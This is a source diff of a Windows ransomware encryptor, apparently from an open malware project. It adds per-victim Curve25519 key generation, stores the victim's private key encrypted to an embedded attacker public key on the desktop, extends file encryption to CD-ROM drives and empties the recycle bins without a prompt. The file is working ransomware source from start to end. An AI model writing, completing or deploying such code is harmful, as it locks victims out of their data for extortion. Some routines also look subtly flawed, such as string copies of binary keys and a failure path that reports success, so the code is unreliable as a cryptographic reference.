@@ -1,16 +1,15 @@
 #include "encryptor.h"
 #include <other/memory.h>
-#include "utility.h"
+#include <other/settings.h>
+#include <other/utility.h>
+#include "wsinternal.h"
 #include "debug.h"
 #include "curve25519.h"
 #include "ecrypt-sync.h"
 #include "sha512.h"
 #include "crc32.h"
 
-/* Size of the ransomware extension in wchar_t. */
-#define SIZE_OF_EXTENSION ((sizeof(RANSOMWARE_EXTENSION) - 1) / sizeof(wchar_t))
-
-/* Public key to encrypt the data with. */
+/* Public key to encrypt private key with. */
 static const BYTE PUBLIC_KEY[32] = { 0x4f, 0xb4, 0x2c, 0xff, 0x34, 0x5f, 0x8f,
     0x7f, 0xe9, 0xdd, 0xe0, 0xec, 0x48, 0x17, 0x6c, 0x01, 0x0c, 0x33, 0x5d,
     0x43, 0x17, 0x58, 0x85, 0x61, 0x58, 0xba, 0x77, 0xb6, 0xb7, 0x2b, 0x82,
@@ -40,11 +39,13 @@ static HANDLE g_hCompletionPort; /* Handle for the IO completion port. */
 static HCRYPTPROV g_hCryptProv; /* Handle for the crypto service provider. */
 static DWORD g_currentPID; /* Current PID. */
 static BOOL g_finishedIterating = FALSE; /* True if finished iterating all drives. */
+static BYTE g_publicKey[32]; /* Global public key to encrypt the files with. */
 
 static DWORD WINAPI encryptionThread(LPVOID lpParam);
 static DWORD WINAPI driveThread(LPVOID lpParam);
 static void iterateDirectory(const wchar_t* path);
 static inline void encryptFile(HANDLE hFile);
+static inline BOOL generateAndStoreKeys();
 
 BOOL mountVolumes()
 {
@@ -148,6 +149,76 @@ cleanup:
     return status;
 }
 
+BOOL generateAndStoreKeys()
+{
+    static const BYTE BASEPOINT[32] = { 9 };
+
+    Session_t session;
+    FileMetadata_t mt;
+    Keys_t keys;
+    ECRYPT_ctx ctx;
+
+    // Generate a private key
+    CryptGenRandom(g_hCryptProv, 32, session.curve25519Private);
+    session.curve25519Private[0] &= 248;
+    session.curve25519Private[31] &= 127;
+    session.curve25519Private[31] |= 64;
+    
+    // Generate a public key
+    curve25519(mt.curve25519Public, session.curve25519Private, BASEPOINT);
+    sstrcpy(g_publicKey, sizeof(g_publicKey), mt.curve25519Public);
+    // Generate a shared secret
+    curve25519(session.curve25519Shared, session.curve25519Private, PUBLIC_KEY);
+    
+    // Initialize the Key & IV for the HC128 algorithm
+    SHA512_Simple(session.curve25519Shared, sizeof(session.curve25519Shared), &keys);
+    ECRYPT_keysetup(&ctx, keys.hc256Key, 256, 256);
+    ECRYPT_ivsetup(&ctx, keys.hc256Vector);
+    mt.xcrc32Hash = xcrc32(&keys, sizeof(Keys_t));
+
+    // Clear sensitive data from memory
+    memset(ctx.key, 0, sizeof(ctx.key));
+    memset(&keys, 0, sizeof(Keys_t));
+    
+    // Encrypt the private key
+    DWORD size = sizeof(session.curve25519Private);
+    BYTE* buffer = (BYTE*)smalloc(size, sizeof(BYTE));
+    sstrcpy(buffer, size, session.curve25519Private);
+    ECRYPT_process_bytes(0, &ctx, buffer, buffer, size);
+    
+#ifdef DEBUG
+    memset(&session, 0, sizeof(Session_t));
+    return TRUE;
+#endif
+    
+    // Write the private key
+    wchar_t* filePath = getDesktopPath();
+    if (!filePath)
+        return FALSE;
+    lstrcatW(filePath, L"\\");
+    lstrcatW(filePath, ENC_PK_FILE_NAME);
+    
+    HANDLE hFile = CreateFileW(filePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE)
+    {
+        sfree(filePath);
+        return FALSE;
+    }
+    
+    DWORD dwWrite;
+    if (!WriteFile(hFile, buffer, size, &dwWrite, NULL))   // Write encrypted data
+        goto cleanup;
+    if (!WriteFile(hFile, &mt, sizeof(mt), &dwWrite, NULL))  // Write metadata
+        goto cleanup;
+    
+cleanup:
+    memset(&session, 0, sizeof(Session_t));
+    CloseHandle(hFile);
+    sfree(filePath);
+    
+    return TRUE;
+}
+
 BOOL encryptDrives()
 {
     // Initialize global variables
@@ -155,6 +226,13 @@ BOOL encryptDrives()
     if (!CryptAcquireContextW(&g_hCryptProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT) &&
         !CryptAcquireContextW(&g_hCryptProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT | CRYPT_NEWKEYSET))
         return FALSE;
+    
+    // Generate global public-private keys
+    if (!generateAndStoreKeys())
+    {
+        CryptReleaseContext(g_hCryptProv, 0);
+        return FALSE;
+    }
     
     SYSTEM_INFO sysInfo;
     GetSystemInfo(&sysInfo);
@@ -187,8 +265,10 @@ BOOL encryptDrives()
         goto cleanup;
     
     // Empty recycle bins
+#ifndef DEBUG
     SHEmptyRecycleBinW(NULL, NULL, SHERB_NOCONFIRMATION | SHERB_NOPROGRESSUI | SHERB_NOSOUND);
-    
+#endif
+
     // Create iterator threads
     DWORD i = 0;
     HANDLE iteratorThreads[MAX_ITERATOR_THREADS];
@@ -374,7 +454,7 @@ DWORD WINAPI driveThread(LPVOID lpParam)
     DWORD driveType;
     if (driveType = GetDriveTypeW(path))
     {
-        if (driveType == DRIVE_FIXED || driveType == DRIVE_REMOVABLE)
+        if (driveType == DRIVE_FIXED || driveType == DRIVE_REMOVABLE || driveType == DRIVE_CDROM)
         {
             dbgmsg("Encrypting drive %ls\n", path);
             iterateDirectory(path);
@@ -481,10 +561,10 @@ void encryptFile(HANDLE hFile)
     // Generate a public key
     curve25519(mt.curve25519Public, session.curve25519Private, BASEPOINT);
     // Generate a shared secret
-    curve25519(session.curve25519Shared, session.curve25519Private, PUBLIC_KEY);
-
+    curve25519(session.curve25519Shared, session.curve25519Private, g_publicKey);
+    
     // Initialize the Key & IV for the HC128 algorithm
-    SHA512_Simple(session.curve25519Shared, 32, &keys);
+    SHA512_Simple(session.curve25519Shared, sizeof(session.curve25519Shared), &keys);
     ECRYPT_keysetup(&ctx, keys.hc256Key, 256, 256);
     ECRYPT_ivsetup(&ctx, keys.hc256Vector);
     mt.xcrc32Hash = xcrc32(&keys, sizeof(Keys_t));
